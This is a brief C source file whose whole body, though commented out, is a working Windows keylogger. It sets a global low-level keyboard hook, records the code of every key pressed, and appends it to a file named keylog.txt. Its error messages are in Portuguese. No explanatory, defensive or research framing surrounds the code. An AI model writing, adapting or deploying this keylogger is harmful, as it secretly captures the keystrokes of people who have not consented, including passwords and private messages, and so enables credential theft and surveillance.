//
// Created by roxyp on 28/10/2024.
//

/*
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define FILE_NAME "keylog.txt"

void log_key(int key) {
    FILE *file = fopen(FILE_NAME, "a");
    if (file == NULL) {
        printf("Erro ao abrir o arquivo.\n");
        return;
    }

    fprintf(file, "%d\n", key);
    fclose(file);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *keyboardStruct = (KBDLLHOOKSTRUCT *)lParam;
    if (wParam == WM_KEYDOWN) {
        log_key(keyboardStruct->vkCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL) {
        printf("Erro ao instalar o hook.\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    return 0;
}

*/
